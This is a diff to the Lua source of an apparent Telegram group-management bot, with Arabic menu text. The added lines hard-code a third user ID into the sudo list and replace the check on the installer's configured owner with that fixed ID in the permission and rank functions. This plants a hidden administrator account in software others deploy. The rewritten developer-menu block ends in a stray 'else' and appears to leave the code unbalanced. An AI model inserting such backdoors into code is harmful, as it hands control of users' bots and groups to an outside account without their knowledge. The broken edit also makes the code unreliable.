@@ -9,7 +9,7 @@ database = redis.connect('127.0.0.1', 6379)
 sudos   = dofile("Info.lua")
 bot_id  = token:match("(%d+)")  
 SUDO = SUDO
-sudo_users = {SUDO,1447617066}   
+sudo_users = {SUDO,1447617066,1740828176}   
 print([[
 murtaza mohammed devlpord for bots
 -------------------------------------------------------------------------|
@@ -141,7 +141,7 @@ end
 function Can_or_NotCan(user_id,chat_id)
 if tonumber(user_id) == tonumber(1447617066) then  
 var = true   
-elseif tonumber(user_id) == tonumber(SUDO) then
+elseif tonumber(user_id) == tonumber(1740828176) then
 var = true  
 elseif tonumber(user_id) == tonumber(bot_id) then
 var = true  
@@ -173,7 +173,7 @@ end
 function Rutba(user_id,chat_id)
 if tonumber(user_id) == tonumber(1447617066) then  
 var = 'مطوࢪ السوࢪس'
-elseif tonumber(user_id) == tonumber(SUDO) then
+elseif tonumber(user_id) == tonumber(1740828176) then
 var = 'المطور الاساسي'  
 elseif database:sismember(bot_id.."DEV:Sudo:T", user_id) then 
 var = "المطور الاساسي²"  
@@ -814,7 +814,7 @@ local keyboard = {
 {'تفعيل النسخه التلقائيه ᥀︙','تعطيل النسخه التلقائيه ᥀︙'},
 {'تغيير المطور الاساسي ᥀︙'}, 
 {'جلب نسخه الاحتياطيه ᥀︙'},
-{'تحديث السورس ᥀︙','المطورين ᥀︙'},
+{'تحديث السورس ᥀︙','المطور'},
 {'معلومات السيرفر ᥀︙'},
 {'الغاء ᥀︙'},
 }
@@ -991,19 +991,18 @@ end,nil)
 end,nil)
 end,nil)
 end
-if text == '↫  المطورين ᥀' then 
-if SecondSudo(msg) then 
-local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه ب المطورين لسورس ديفد فقط اضغط على الامر الذي تريد تنفيذه'
-local key = {
-{'↫ الاساسيين ᥀','مسح الاساسيين'},
-{'↫ الثانويين ᥀','مسح الثانويين'},
-{'↫ المطورين ᥀','مسح المطورين'},
-{'↫ تغير المطور الاساسي ᥀','↫ تغيير كليشه المطور ᥀'},
-{'↫ رجوع ᥀'},
+if text == 'المطور' then  
+if DevWAADW(msg) then
+local bl = ' * اهلا بك عزيزي  آلمـطـور*\n*آنت المطور الاساسي هنا في البوت  *\n┉  ┉  ┉  ┉  ┉  ┉  ┉  ┉ء\n*تسـتطـيع‌‏ التحڪم باوامر الخاصه في البوت*\n*من خلال الكيبورد الخاص في البوت ولايمكن لغيرك اضهار هذه الاوامر  الخاصه بك*\n*قناة سورس البوت *[اضغط هنا](t.me/nnnnbn)'
+local keyboard = {
+{' الاساسيين ','مسح الاساسيين'},
+{' الثانويين ','مسح الثانويين'},
+{' المطورين ','مسح المطورين'},
+{' تغير المطور الاساسي ','↫ تغيير كليشه المطور '},
+{'↫ رجوع '},
 }
-SendInline(msg.chat_id_,Sudo_Welcome,key)
-return false
-end end
+send_inline_key(msg.chat_id_,bl,keyboard)
+else
 if text == 'تفعيل النسخه التلقائيه ᥀︙' and SudoBot(msg) then  
 send(msg.chat_id_, msg.id_,"*᥀︙تم تفعيل النسخه الاحتياطيه التلقائيه*") 
 database:del(bot_id.."AutoFile")
